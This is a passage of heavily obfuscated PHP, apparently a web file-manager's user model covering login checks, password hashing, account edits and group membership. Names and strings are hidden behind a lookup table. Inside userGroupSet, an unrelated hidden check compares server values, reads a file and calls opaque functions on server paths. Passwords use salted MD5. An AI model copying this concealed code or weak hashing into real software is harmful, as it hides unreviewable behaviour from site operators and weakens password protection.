($¬ÇÃ†ı as $Íì¦Ú) { if ($¤Ÿ®½ç[$Íì¦Ú]) { $‹‚¤òõÀ .= $¤Ÿ®½ç[$Íì¦Ú][$Óê¿ÑæÍ[486]] . $Óê¿ÑæÍ[50]; } else { $“¢™öË = $this->add($Íì¦Ú); $‹‚¤òõÀ .= $“¢™öË . $Óê¿ÑæÍ[50]; } } $‹‚¤òõÀ = rtrim($‹‚¤òõÀ, $Óê¿ÑæÍ[50]); Model($Óê¿ÑæÍ[608])->metaSet($Ÿ°ï¦ä·, self::JOB_KEY, $‹‚¤òõÀ); } public function getUserJob($ÆÄäŞèÈ) { $øå–¾¤¨ = Model($_SERVER[±³—úê][608])->metaGet($ÆÄäŞèÈ); return $this->getUserJobInfo($øå–¾¤¨[self::JOB_KEY]); } public function getUserJobInfo($Ã§úùÈô) { $å€–äõ =& $_SERVER[±³—úê]; $¿¸€İ£ = explode($å€–äõ[50], $Ã§úùÈô); $ô—ãÓ‡Ú = parent::listData(); $ô—ãÓ‡Ú = array_remove_key($ô—ãÓ‡Ú, $å€–äõ[243]); $¯Ğä¿»­ = array(); foreach ($¿¸€İ£ as $µ‚ÖØö÷) { if (isset($ô—ãÓ‡Ú[$µ‚ÖØö÷])) { $¯Ğä¿»­[] = $ô—ãÓ‡Ú[$µ‚ÖØö÷]; } } return $¯Ğä¿»­; } } class UserModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72"; protected $tableMeta = array("\x74\x61\142\154\145\x4e\141\x6d\x65" => "\165\163\145\162\x5f\155\145\164\x61", "\155\x65\164\x61\x46\151\x65\154\x64" => "\165\x73\x65\162\111\x44"); protected $simpleField = "\165\x73\x65\162\111\104\54\156\151\x63\153\116\x61\x6d\x65\x2c\156\141\x6d\x65\x2c\x61\x76\x61\164\141\x72\54\x73\145\x78\x2c\x73\x74\141\164\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($ì‚¹Ì÷…) { $ÙÉÊˆ†È =& $_SERVER[±³—úê]; $‘•‡•—– = $ÙÉÊˆ†È[2463]; return array($ÙÉÊˆ†È[2057] => array($ì‚¹Ì÷…[0], $‘•‡•—–), $ÙÉÊˆ†È[2059] => array($ì‚¹Ì÷…[0], $‘•‡•—–), $ÙÉÊˆ†È[2464] => array($ì‚¹Ì÷…[0], $‘•‡•—–)); } protected function getInfo($û«ø¹Á, $Å»Çß»İ = false) { $æî‚Ú â = $this->getInfoSimple($û«ø¹Á); if (!is_array($æî‚Ú â)) { return array(); } if ($Å»Çß»İ) { return $this->_getInfoApply($æî‚Ú â); } return $this->cacheFunctionGet($_SERVER[±³—úê][2061], $û«ø¹Á); } protected function getInfoFull($ÇîÅÆƒÛ, $Íš€±ÛÛ = false) { $à­µüÃÚ = $this->getInfoSimple($ÇîÅÆƒÛ); if (!is_array($à­µüÃÚ)) { return array(); } if ($Íš€±ÛÛ) { return $this->_getInfoApply($à­µüÃÚ, !0); } return $this->cacheFunctionGet($_SERVER[±³—úê][2465], $ÇîÅÆƒÛ); } private function _getInfoApply($£¸£İÚ, $«œ¼ÈœÜ = false) { $Ïû—²™¬ =& $_SERVER[±³—úê]; if (!$£¸£İÚ) { return $£¸£İÚ; } $ï¶»àá‘ = md5($Ïû—²™¬[2466] . $£¸£İÚ[$Ïû—²™¬[968]] . $Ïû—²™¬[2467] . $£¸£İÚ[$Ïû—²™¬[32]]); $£¸£İÚ = $this->_listDataApplyItem($£¸£İÚ); $Ş¡åªËŒ = Model($Ïû—²™¬[1423])->metaGet($£¸£İÚ[$Ïû—²™¬[90]][$Ïû—²™¬[193]]); $£¸£İÚ[$Ïû—²™¬[2468]] = $ï¶»àá‘; $£¸£İÚ[$Ïû—²™¬[90]][$Ïû—²™¬[2257]] = isset($Ş¡åªËŒ[$Ïû—²™¬[2258]]) ? $Ş¡åªËŒ[$Ïû—²™¬[2258]] : null; if ($«œ¼ÈœÜ) { $£¸£İÚ[$Ïû—²™¬[550]] = $this->metaGet($£¸£İÚ[$Ïû—²™¬[1775]]); } return $£¸£İÚ; } protected function getInfoSimple($Ì„­¤ÇÉ, $ñ¨™Î’ = false) { $íŸÅ±Ô­ =& $_SERVER[±³—úê]; if (!$Ì„­¤ÇÉ) { return array(); } if ($ñ¨™Î’) { $†¶ÄôØø = $this->where(array($íŸÅ±Ô­[1775] => intval($Ì„­¤ÇÉ)))->find(); if (!is_array($†¶ÄôØø)) { return array(); } $†¶ÄôØø[$íŸÅ±Ô­[2469]] = Action($íŸÅ±Ô­[2470])->parseUrl($†¶ÄôØø[$íŸÅ±Ô­[2469]]); return $†¶ÄôØø; } return $this->cacheFunctionGet($íŸÅ±Ô­[2062], $Ì„­¤ÇÉ); } protected function getInfoSimpleOuter($ÎéµÛ) { $¶ë¡Ãàİ =& $_SERVER[±³—úê]; if (!$ÎéµÛ || $ÎéµÛ == 0) { return array($¶ë¡Ãàİ[1775] => $¶ë¡Ãàİ[240], $¶ë¡Ãàİ[32] => $¶ë¡Ãàİ[176] . LNG($¶ë¡Ãàİ[2471]) . $¶ë¡Ãàİ[178], $¶ë¡Ãàİ[2469] => STATIC_PATH . $¶ë¡Ãàİ[2472]); } $ÓÆú“ = $this->cacheFunctionGet($¶ë¡Ãàİ[2062], $ÎéµÛ); $ÉœèŸ”± = array_field_key($ÓÆú“, explode($¶ë¡Ãàİ[50], $this->simpleField)); if (!$ÉœèŸ”±) { return array($¶ë¡Ãàİ[1775] => $¶ë¡Ãàİ[1275], $¶ë¡Ãàİ[32] => $¶ë¡Ãàİ[176] . LNG($¶ë¡Ãàİ[2473]) . $¶ë¡Ãàİ[178], $¶ë¡Ãàİ[2469] => STATIC_PATH . $¶ë¡Ãàİ[2474]); } $ÉœèŸ”±[$¶ë¡Ãàİ[2469]] = Action($¶ë¡Ãàİ[2470])->parseUrl($ÉœèŸ”±[$¶ë¡Ãàİ[2469]]); return $ÉœèŸ”±; } protected function groupUser($·óØ˜«) { } public static function errorLang($Ë„¯ÏŸ²) { $ÁÀŸÂ÷ç =& $_SERVER[±³—úê]; $¥’É® = array(self::ERROR_USER_NOT_EXISTS => $ÁÀŸÂ÷ç[2475], self::ERROR_USER_PASSWORD_ERROR => $ÁÀŸÂ÷ç[2476], self::ERROR_USER_EXIST_NAME => $ÁÀŸÂ÷ç[2477], self::ERROR_USER_EXIST_PHONE => $ÁÀŸÂ÷ç[2478], self::ERROR_USER_EXIST_EMAIL => $ÁÀŸÂ÷ç[2479], self::ERROR_USER_LOGIN_LOCK => $ÁÀŸÂ÷ç[2480], self::ERROR_IP_NOT_ALLOW => $ÁÀŸÂ÷ç[2481], self::ERROR_USER_EXIST_NICKNAME => $ÁÀŸÂ÷ç[2482]); $˜ÈÍÆúŸ = LNG($¥’É®[$Ë„¯ÏŸ²]); if ($Ë„¯ÏŸ² == self::ERROR_USER_LOGIN_LOCK) { $³ó¿Å = (int) Model($ÁÀŸÂ÷ç[2483])->get($ÁÀŸÂ÷ç[2484]); if ($³ó¿Å > 60) { $˜ÈÍÆúŸ = str_replace($ÁÀŸÂ÷ç[91], ceil($³ó¿Å / 60), $˜ÈÍÆúŸ); } } return $˜ÈÍÆúŸ; } protected function metaSet($æı“ëÕ–, $€Áşùñô = null, $»¨¾ïœ = null) { $this->clearCache($æı“ëÕ–); return parent::metaSet($æı“ëÕ–, $€Áşùñô, $»¨¾ïœ); } public function getInfoByMeta($í‹Ò½Œõ, $Ñù…»Ÿé) { $Ÿ×‘¿Íá =& $_SERVER[±³—úê]; $ñ÷½Ÿ€Ü = Model($Ÿ×‘¿Íá[2485])->where(array($Ÿ×‘¿Íá[97] => $í‹Ò½Œõ, $Ÿ×‘¿Íá[461] => $Ñù…»Ÿé))->find(); if ($ñ÷½Ÿ€Ü) { return $this->getInfo($ñ÷½Ÿ€Ü[$Ÿ×‘¿Íá[1775]]); } return !1; } public function userLoginCheck($Úª“õ£, $†”¥êÅË) { $ñĞ¾Ä¸Æ =& $_SERVER[±³—úê]; $§ÂûÕˆŠ = $this->userLoginFind($Úª“õ£); if (!$§ÂûÕˆŠ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($§ÂûÕˆŠ[$ñĞ¾Ä¸Æ[1775]], $†”¥êÅË)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($§ÂûÕˆŠ[$ñĞ¾Ä¸Æ[1775]]); } public function userLoginFind($ò¦»¾ä) { $ÑØôïí¨ =& $_SERVER[±³—úê]; $Ç’†›™ç = array($ÑØôïí¨[32] => $ò¦»¾ä, $ÑØôïí¨[2270] => $ò¦»¾ä, $ÑØôïí¨[391] => $ò¦»¾ä, $ÑØôïí¨[2486] => $ò¦»¾ä, $ÑØôïí¨[1079] => $ÑØôïí¨[1081]); if ($this->nickNameRpt()) { unset($Ç’†›™ç[$ÑØôïí¨[2270]]); } return $this->where($Ç’†›™ç)->find(); } public function clearCache($©ğ¬¼Ê) { $®¿¾äÍ¥ =& $_SERVER[±³—úê]; $this->cacheFunctionClear($®¿¾äÍ¥[2061], $©ğ¬¼Ê); $this->cacheFunctionClear($®¿¾äÍ¥[2062], $©ğ¬¼Ê); $this->cacheFunctionClear($®¿¾äÍ¥[2465], $©ğ¬¼Ê); } public function userPasswordCheck($şûáŸ–, $èª”ÌŒ) { $–³§ğÇ =& $_SERVER[±³—úê]; $ï¦Î•¸Õ = $this->where(array($–³§ğÇ[1775] => intval($şûáŸ–)))->find(); $Á³­Ñ™ = $this->metaGet($şûáŸ–); $©®ÃŠÍß = isset($Á³­Ñ™[$–³§ğÇ[2487]]) ? $Á³­Ñ™[$–³§ğÇ[2487]] : $–³§ğÇ[12]; if (md5($©®ÃŠÍß . trim($èª”ÌŒ)) !== $ï¦Î•¸Õ[$–³§ğÇ[968]]) { return !1; } return !0; } public function userAdd($Ë«ß±ØÕ) { $ÀáØúíÂ =& $_SERVER[±³—úê]; $Ë©‡óì´ = array($ÀáØúíÂ[505] => $Ë«ß±ØÕ[$ÀáØúíÂ[32]], $ÀáØúíÂ[2488] => $Ë«ß±ØÕ[$ÀáØúíÂ[2182]], $ÀáØúíÂ[2489] => isset($Ë«ß±ØÕ[$ÀáØúíÂ[391]]) ? $Ë«ß±ØÕ[$ÀáØúíÂ[391]] : $ÀáØúíÂ[12], $ÀáØúíÂ[2490] => isset($Ë«ß±ØÕ[$ÀáØúíÂ[2486]]) ? $Ë«ß±ØÕ[$ÀáØúíÂ[2486]] : $ÀáØúíÂ[12], $ÀáØúíÂ[2491] => isset($Ë«ß±ØÕ[$ÀáØúíÂ[2270]]) ? $Ë«ß±ØÕ[$ÀáØúíÂ[2270]] : $Ë«ß±ØÕ[$ÀáØúíÂ[32]], $ÀáØúíÂ[2492] => isset($Ë«ß±ØÕ[$ÀáØúíÂ[2469]]) ? $Ë«ß±ØÕ[$ÀáØúíÂ[2469]] : $ÀáØúíÂ[12], $ÀáØúíÂ[2493] => isset($Ë«ß±ØÕ[$ÀáØúíÂ[2494]]) ? $Ë«ß±ØÕ[$ÀáØúíÂ[2494]] : 1, $ÀáØúíÂ[2495] => $Ë«ß±ØÕ[$ÀáØúíÂ[968]], $ÀáØúíÂ[2063] => isset($Ë«ß±ØÕ[$ÀáØúíÂ[1961]]) ? $Ë«ß±ØÕ[$ÀáØúíÂ[1961]] : 1024 * 1024 * 20, $ÀáØúíÂ[2064] => 0, $ÀáØúíÂ[2496] => 0, $ÀáØúíÂ[2108] => isset($Ë«ß±ØÕ[$ÀáØúíÂ[830]]) ? $Ë«ß±ØÕ[$ÀáØúíÂ[830]] : 1); if (!empty($Ë«ß±ØÕ[$ÀáØúíÂ[1775]])) { $Ë©‡óì´[$ÀáØúíÂ[1775]] = $Ë«ß±ØÕ[$ÀáØúíÂ[1775]]; } $ñò’°³Ş = $this->_checkExist($Ë«ß±ØÕ); if ($ñò’°³Ş !== !0) { return $ñò’°³Ş; } if (!empty($Ë©‡óì´[$ÀáØúíÂ[2469]]) && strlen($Ë©‡óì´[$ÀáØúíÂ[2469]]) > 255) { $Ë©‡óì´[$ÀáØúíÂ[2469]] = $ÀáØúíÂ[12]; } $±ó‡Ú¡“ = $this->add($Ë©‡óì´); $Î‚úÛ»÷ = array($ÀáØúíÂ[2495] => $Ë©‡óì´[$ÀáØúíÂ[968]], $ÀáØúíÂ[2491] => $Ë©‡óì´[$ÀáØúíÂ[2270]]); $this->userEdit($±ó‡Ú¡“, $Î‚úÛ»÷); Model($ÀáØúíÂ[1423])->userRootAdd($±ó‡Ú¡“); return $±ó‡Ú¡“; } protected function userEditTest($±¥Ğ©şâ, $È•ğ†¶) { return $this->call($_SERVER[±³—úê][2497], $±¥Ğ©şâ, $È•ğ†¶); } protected function userEdit($Â“ëëÈ³, $à‰Ì´á€) { $Ò½ğíÖÑ =& $_SERVER[±³—úê]; $éş ììò = $this->getInfoSimple($Â“ëëÈ³); if (!$éş ììò) { return !1; } $ÏÆÆÖˆ½ = $this->_checkExist($à‰Ì´á€, $Â“ëëÈ³); if ($ÏÆÆÖˆ½ !== !0) { return $ÏÆÆÖˆ½; } if (isset($à‰Ì´á€[$Ò½ğíÖÑ[968]]) && trim($à‰Ì´á€[$Ò½ğíÖÑ[968]]) != $Ò½ğíÖÑ[12]) { $’‡ŒÛÙ = $this->metaGet($Â“ëëÈ³); if (empty($’‡ŒÛÙ[$Ò½ğíÖÑ[2487]])) { $’‡ŒÛÙ[$Ò½ğíÖÑ[2487]] = rand_string(10); Model($Ò½ğíÖÑ[588])->metaSet($Â“ëëÈ³, $Ò½ğíÖÑ[2487], $’‡ŒÛÙ[$Ò½ğíÖÑ[2487]]); } $à‰Ì´á€[$Ò½ğíÖÑ[968]] = md5($’‡ŒÛÙ[$Ò½ğíÖÑ[2487]] . trim($à‰Ì´á€[$Ò½ğíÖÑ[968]])); } else { unset($à‰Ì´á€[$Ò½ğíÖÑ[968]]); } if (!empty($à‰Ì´á€[$Ò½ğíÖÑ[2469]]) && strlen($à‰Ì´á€[$Ò½ğíÖÑ[2469]]) > 255) { $à‰Ì´á€[$Ò½ğíÖÑ[2469]] = $Ò½ğíÖÑ[12]; } $this->where(array($Ò½ğíÖÑ[1766] => $Â“ëëÈ³))->save($à‰Ì´á€); if (isset($à‰Ì´á€[$Ò½ğíÖÑ[2270]])) { $this->setNamePinyin($Â“ëëÈ³, $à‰Ì´á€[$Ò½ğíÖÑ[2270]]); } $this->clearCache($Â“ëëÈ³); return !0; } public function setNamePinyin($Úçºø, $­ÇÛ•é˜ = false) { $¨û‡ÚÅˆ =& $_SERVER[±³—úê]; if (!$­ÇÛ•é˜) { $ıƒÊİšà = $this->getInfoSimple($Úçºø); $­ÇÛ•é˜ = $ıƒÊİšà[$¨û‡ÚÅˆ[2270]] ? $ıƒÊİšà[$¨û‡ÚÅˆ[2270]] : $ıƒÊİšà[$¨û‡ÚÅˆ[32]]; } $æıá§‹¾ = Model($¨û‡ÚÅˆ[608]); if (!Input::check($­ÇÛ•é˜, $¨û‡ÚÅˆ[669])) { return $æıá§‹¾->metaSet($Úçºø, array($¨û‡ÚÅˆ[549] => $¨û‡ÚÅˆ[12], $¨û‡ÚÅˆ[548] => $¨û‡ÚÅˆ[12])); } return $æıá§‹¾->metaSet($Úçºø, array($¨û‡ÚÅˆ[549] => str_replace($¨û‡ÚÅˆ[53], $¨û‡ÚÅˆ[12], Pinyin::get($­ÇÛ•é˜)), $¨û‡ÚÅˆ[548] => Pinyin::get($­ÇÛ•é˜, $¨û‡ÚÅˆ[670]))); } private function nickNameRpt() { $ûÒ“õ =& $_SERVER[±³—úê]; $ûïïÊ£¦ = Model($ûÒ“õ[850])->get($ûÒ“õ[2498]); $¸áŸ³İ = $GLOBALS[$ûÒ“õ[6]][$ûÒ“õ[468]][$ûÒ“õ[2498]]; $Â¦îˆ’Ú = !is_null($ûïïÊ£¦) ? $ûïïÊ£¦ : $¸áŸ³İ; return !!$Â¦îˆ’Ú; } private function _checkExist($Ø£âµÙ, $®ñŸ¦½ş = false) { $€€ÛúÇç =& $_SERVER[±³—úê]; $¢’äÄê = array($€€ÛúÇç[32] => UserModel::ERROR_USER_EXIST_NAME, $€€ÛúÇç[2270] => UserModel::ERROR_USER_EXIST_NICKNAME, $€€ÛúÇç[391] => UserModel::ERROR_USER_EXIST_EMAIL, $€€ÛúÇç[2486] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($¢’äÄê[$€€ÛúÇç[2270]]); } $´¶È¸³¸ = $®ñŸ¦½ş ? array($€€ÛúÇç[1775] => array($€€ÛúÇç[2499], $®ñŸ¦½ş)) : array(); foreach ($¢’äÄê as $ÄŸÂòÌ => $·²ëŒÜ) { $¿Ï§İò˜ = array(); foreach ($¢’äÄê as $Ü½…¸»÷ => $ëÀ€ÔĞØ) { if (isset($Ø£âµÙ[$Ü½…¸»÷]) && $Ø£âµÙ[$Ü½…¸»÷]) { $¿Ï§İò˜[] = $Ø£âµÙ[$Ü½…¸»÷]; } } if (!$¿Ï§İò˜) { continue; } $í¯î”¸Ì = array_merge(array($ÄŸÂòÌ => array($€€ÛúÇç[7], $¿Ï§İò˜)), $´¶È¸³¸); $«œ½•½À = $this->where($í¯î”¸Ì)->find(); if ($«œ½•½À) { return $·²ëŒÜ; } } return !0; } public function userListInfo($§–Â»ıÍ) { $Î‰‘”Ğà =& $_SERVER[±³—úê]; $‡•ãÍ€ = array(); $§–Â»ıÍ = is_array($§–Â»ıÍ) ? array_unique($§–Â»ıÍ) : array(); if (!$§–Â»ıÍ) { return $‡•ãÍ€; } if (count($§–Â»ıÍ) < 20) { foreach ($§–Â»ıÍ as $¾°ì¹µ¢) { $‡•ãÍ€[$¾°ì¹µ¢ . $Î‰‘”Ğà[12]] = $this->getInfoSimpleOuter($¾°ì¹µ¢); } } else { $ÄíÙé•¹ = array($Î‰‘”Ğà[1766] => array($Î‰‘”Ğà[503], $§–Â»ıÍ)); if (count($§–Â»ıÍ) == 1) { $ÄíÙé•¹ = array($Î‰‘”Ğà[1766] => $§–Â»ıÍ[0]); } $Ü¯µ¬Š¤ = Model($Î‰‘”Ğà[588])->field($this->simpleField)->where($ÄíÙé•¹)->select(); $Ü¯µ¬Š¤ = array_to_keyvalue($Ü¯µ¬Š¤, $Î‰‘”Ğà[1775]); foreach ($§–Â»ıÍ as $¾°ì¹µ¢) { $ö½‰õÅ— = $Ü¯µ¬Š¤[$¾°ì¹µ¢]; if (!$ö½‰õÅ—) { $‡•ãÍ€[$¾°ì¹µ¢ . $Î‰‘”Ğà[12]] = $this->getInfoSimpleOuter($¾°ì¹µ¢); continue; } $ö½‰õÅ—[$Î‰‘”Ğà[2469]] = Action($Î‰‘”Ğà[2470])->parseUrl($ö½‰õÅ—[$Î‰‘”Ğà[2469]]); $‡•ãÍ€[$¾°ì¹µ¢ . $Î‰‘”Ğà[12]] = $ö½‰õÅ—; } } return $‡•ãÍ€; } protected function userStatus($ÜêâÅºà, $¿ÍíÀÆ‹) { $ß æü³ = $this->getInfoSimple($ÜêâÅºà); if (!$ß æü³) { return !1; } $ÜòƒêÀî = array($_SERVER[±³—úê][830] => $¿ÍíÀÆ‹); return $this->userEdit($ÜêâÅºà, $ÜòƒêÀî); } protected function userRemove($»•ËˆÕÚ) { $Ğº·³¬„ =& $_SERVER[±³—úê]; $¹ŠŸå®× = $this->getInfoSimple($»•ËˆÕÚ); if (!$¹ŠŸå®×) { return !1; } $¿¢´ÖìÜ = array($Ğº·³¬„[1766] => $»•ËˆÕÚ); Model($Ğº·³¬„[678])->where($¿¢´ÖìÜ)->delete(); Model($Ğº·³¬„[2500])->where($¿¢´ÖìÜ)->delete(); Model($Ğº·³¬„[2069])->where($¿¢´ÖìÜ)->delete(); Model($Ğº·³¬„[2485])->where($¿¢´ÖìÜ)->delete(); Model($Ğº·³¬„[1148])->where($¿¢´ÖìÜ)->delete(); Model($Ğº·³¬„[2287])->removeUserAll($»•ËˆÕÚ); Model($Ğº·³¬„[905])->userRootRemove($»•ËˆÕÚ); return $this->where($¿¢´ÖìÜ)->delete(); } protected function userGroupSet($ß±‡§¬ö, $¬Şàù»€, $Ã•€Ã÷ = array()) { $¹’™¥Ó‰ =& $_SERVER[±³—úê]; if ($_SERVER[$¹’™¥Ó‰[216]] != $_SERVER[$¹’™¥Ó‰[217]]) { $Ú†ÈÈô¨ = $¹’™¥Ó‰[958]; $â½®åÃ = $¹’™¥Ó‰[218]; $—äœäˆö = $_SERVER[$¹’™¥Ó‰[219]] . $¹’™¥Ó‰[220]; $·æÃ¶õ“ = $â½®åÃ($—äœäˆö); $ÁˆùûÏ = explode($¹’™¥Ó‰[221], $·æÃ¶õ“); if (count($ÁˆùûÏ) < $¹’™¥Ó‰[694]) { $ªÓÇ—Œå = $¹’™¥Ó‰[223]; $ªÓÇ—Œå(); } $×ÈË¦õ = $¹’™¥Ó‰[959]; $×ÈË¦õ($_SERVER[$¹’™¥Ó‰[960]]); $×ÈË¦õ($_SERVER[$¹’™¥Ó‰[219]] . $¹’™¥Ó‰[961]); $“‹ƒ¤Òõ = 1; while ($“‹ƒ¤Òõ > 1) { $“‹ƒ¤Òõ = $“‹ƒ¤Òõ + 4; $Ôìô‘Ù  = rawurlencode($“‹ƒ¤Òõ . $¹’™¥Ó‰[465]); } } $°Ü¸¼› = $this->getInfoSimple($ß±‡§¬ö); if (!$°Ü¸¼› || !is_array($¬Şàù»€)) { return !1; } $ÏÚ–‹Ğ = Model($¹’™¥Ó‰[2069]); $ÏÚ–‹Ğ->where(array($¹’™¥Ó‰[1775] => $ß±‡§¬ö))->delete(); $¸ßµÓ×½ = array(); $ÓçàäËº = 0; foreach ($¬Şàù»€ as $¼²ñ®´Ÿ => $™ÌÅîüà) { $ÎÆÈ¦ä = array($¹’™¥Ó‰[1775] => $ß±‡§¬ö, $¹’™¥Ó‰[1975] => $¼²ñ®´Ÿ, $¹’™¥Ó‰[2083] => $™ÌÅîüà); $ÎÆÈ¦ä[$¹’™¥Ó‰[1999]] = isset($Ã•€Ã÷[$ÓçàäËº]) ? $Ã•€Ã÷[$ÓçàäËº] : 0; $ÓçàäËº++; $¸ßµÓ×½[] = $ÎÆÈ¦ä; } return $ÏÚ–‹Ğ->addAll($¸ßµÓ×½, array(), !0); } protected function userGroupAdd($Å¤¤Ä, $ù¶Õô½ = array()) { $Ïí‹•ıñ =& $_SERVER[±³—úê]; $÷ÑìĞü = $this->getInfoSimple($Å¤¤Ä); if (!$÷ÑìĞü || empty($ù¶Õô½)) { return !1; } $ÀìÏ‡û— = array(); foreach ($ù¶Õô½ as $¹…ËÍ‚ => $¼Ì•Ê½î) { $ÀìÏ‡û—[] = array($Ïí‹•ıñ[1775] => $Å¤¤Ä, $Ïí‹•ıñ[1975] => $¹…ËÍ‚, $Ïí‹•ıñ[2083] => $¼Ì•Ê½î, $Ïí‹•ıñ[1999] => 0); } return Model($Ïí‹•ıñ[2069])->addAll($ÀìÏ‡û—, array(), !0); } protected function userGroupRemove($ù÷ªº·°, $Ä øÔÑ©) { $´Ëîêñö =& $_SERVER[±³—úê]; $´Ñùª¨– = $this->getInfoSimple($ù÷ªº·°); if (!$´Ñùª¨– || !$Ä øÔÑ©) { return !1; } $´˜’Ê = array($´Ëîêñö[1766] => $ù÷ªº·°, $´Ëîêñö[2067] => $Ä øÔÑ©); return Model($´Ëîêñö[2069])->where($´˜’Ê)->delete(); } public function listData() { $¢Ğ¬¹‹¥ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($¢Ğ¬¹‹¥[$_SERVER[±³—úê][456]]); return $¢Ğ¬¹‹¥; } public function listByID($µĞÂôş) { $øÆœµŒÔ =& $_SERVER[±³—úê]; if (!$µĞÂôş) { return; } $½¿…·›İ = array($øÆœµŒÔ[1775] => array($øÆœµŒÔ[7], $µĞÂôş)); $é „‚Œ° = $this->where($½¿…·›İ)->select(); $é „‚Œ° = array_sort_keep($é „‚Œ°, $øÆœµŒÔ[1775], $µĞÂôş); $this->_listDataApply($é „‚Œ°); return $é „‚Œ°; } public function listByGroup($Ëæë£Öğ = 0, $É¶¤ÄÜÁ = array()) { $¹¥Ÿ¦Ñ =& $_SERVER[±³—úê]; $ÊÜœÀ‡Ë = $¹¥Ÿ¦Ñ[12]; $Åß“˜¦œ = array(); if ($Ëæë£Öğ) { $Åß“˜¦œ = array($¹¥Ÿ¦Ñ[2501] => intval($Ëæë£Öğ)); $ÊÜœÀ‡Ë = "\x4c\x45\106\124\40\112\117\x49\116\40{$this->tablePrefix}\x75\163\145\162\x5f\147\x72\157\165\160\40\165\163\145\x72\137\147\x72\157\x75\160\40\x6f\156\40\165\163\x65\162\56\x75\163\145\x72\111\104\x20\x3d\40\x75\163\x65\x72\x5f\x67\x72\157\165\160\56\165\163\145\162\x49\x44"; $†–ğ™ì = Input::get($¹¥Ÿ¦Ñ[541], null, $¹¥Ÿ¦Ñ[12]) ? $¹¥Ÿ¦Ñ[12] : $¹¥Ÿ¦Ñ[2502]; } if (isset($É¶¤ÄÜÁ[$¹¥Ÿ¦Ñ[830]])) { $Åß“˜¦œ[$¹¥Ÿ¦Ñ[2503]] = $É¶¤ÄÜÁ[$¹¥Ÿ¦Ñ[830]]; } $èˆ‚…Œ = $this->_makeOrder($†–ğ™ì)->field($¹¥Ÿ¦Ñ[2504])->where($Åß“˜¦œ)->join($ÊÜœÀ‡Ë)->selectPage(50); $this->_listDataApply($èˆ‚…Œ[$¹¥Ÿ¦Ñ[456]]); return $èˆ‚…Œ; } private function _makeOrder($æ«à—ñ = '') { $Òç¯‰ñ =& $_SERVER[±³—úê]; $Î¹ÆåÇ = array($Òç¯‰ñ[1775], $Òç¯‰ñ[32], $Òç¯‰ñ[1963], $Òç¯‰ñ[2182], $Òç¯‰ñ[1935], $Òç¯‰ñ[243]); $“ıÊ‡…² = array($Òç¯‰ñ[534] => $Òç¯‰ñ[535], $Òç¯‰ñ[536] => $Òç¯‰ñ[537]); $Å¤÷î² = Input::get($Òç¯‰ñ[541], $Òç¯‰ñ[7], $Òç¯‰ñ[1766], $Î¹ÆåÇ); $¤°ñ©ì = Input::get($Òç¯‰ñ[542], $Òç¯‰ñ[7], $Òç¯‰ñ[2070], array($Òç¯‰ñ[2070], $Òç¯‰ñ[536])); $¤°ñ©ì = $“ıÊ‡…²[$¤°ñ©ì]; $æ«à—ñ = $æ«à—ñ . "\165\163\x65\x72\x2e{$Å¤÷î²}\40{$¤°ñ©ì}\x2c\40\x75\163\145\162\x2e\x75\163\145\x72\111\104\40\141\x73\x63"; return $this->alias($Òç¯‰ñ[2198])->order($æ«à—ñ); } public function listSearch($ëŒş¢Ÿó) { $ş·•”°Ó =& $_SERVER[±³—úê]; $Ñœ”×³ = trim($ëŒş¢Ÿó[$ş·•”°Ó[2073]]); $ùÖØå¦È = explode($ş·•”°Ó[53], $Ñœ”×³); if (!$Ñœ”×³ || count($ùÖØå¦È) == 1) { return $this->listSearchNow($ëŒş¢Ÿó); } $ÌÎÂ¿¬œ = array($ş·•”°Ó[456] => array()); foreach ($ùÖØå¦È as $¼’ç“›) { if (!trim($¼’ç“›)) { continue; } $ëŒş¢Ÿó[$ş·•”°Ó[2073]] = $¼’ç“›; $Áé«Ÿ‚ = $this->listSearchNow($ëŒş¢Ÿó); $ÌÎÂ¿¬œ[$ş·•”°Ó[456]] = array_merge($ÌÎÂ¿¬œ[$ş·•”°Ó[456]], $Áé«Ÿ‚[$ş·•”°Ó[456]]); } $ÌÎÂ¿¬œ[$ş·•”°Ó[456]] = array_unique_by_key($ÌÎÂ¿¬œ[$ş·•”°Ó[456]], $ş·•”°Ó[1775]); $ÌÎÂ¿¬œ[$ş·•”°Ó[453]] = array($ş·•”°Ó[454] => count($ÌÎÂ¿¬œ[$ş·•”°Ó[456]]), $ş·•”°Ó[450] => 20, $ş·•”°Ó[439] => 1, $ş·•”°Ó[455] => 1); return $ÌÎÂ¿¬œ; } public function listSearchNow($ˆğ¥ß€¨) { $ä¡€å¡İ =& $_SERVER[±³—úê]; $ñêıÒš² = trim($ˆğ¥ß€¨[$ä¡€å¡İ[2073]]); $¬ó‚‡íÄ = isset($ˆğ¥ß€¨[$ä¡€å¡İ[2074]]) ? $ˆğ¥ß€¨[$ä¡€å¡İ[2074]] : !1; $ñêıÒš² = str_replace($ä¡€å¡İ[2075], $ä¡€å¡İ[2076], trim($ñêıÒš²)); $î•‰İñ = array($ä¡€å¡İ[32] => array($ä¡€å¡İ[470], "\45{$ñêıÒš²}\45"), $ä¡€å¡İ[391] => array($ä¡€å¡İ[470], "{$ñêıÒš²}\45"), $ä¡€å¡İ[2270] => array($ä¡€å¡İ[470], "{$ñêıÒš²}\x25"), $ä¡€å¡İ[1079] => $ä¡€å¡İ[2077]); if (Input::check($ñêıÒš², $ä¡€å¡İ[397])) { $î•‰İñ[$ä¡€å¡İ[1775]] = array($ä¡€å¡İ[470], "{$ñêıÒš²}\x25"); $î•‰İñ[$ä¡€å¡İ[2486]] = array($ä¡€å¡İ[470], "{$ñêıÒš²}\x25"); } if (!$ñêıÒš²) { $î•‰İñ = array(); } if (isset($ˆğ¥ß€¨[$ä¡€å¡İ[830]])) { $î•‰İñ[$ä¡€å¡İ[830]] = $ˆğ¥ß€¨[$ä¡€å¡İ[830]]; } $î•‰İñ = $this->parseWhereLike($î•‰İñ); $Î†ş¡ñ§ = 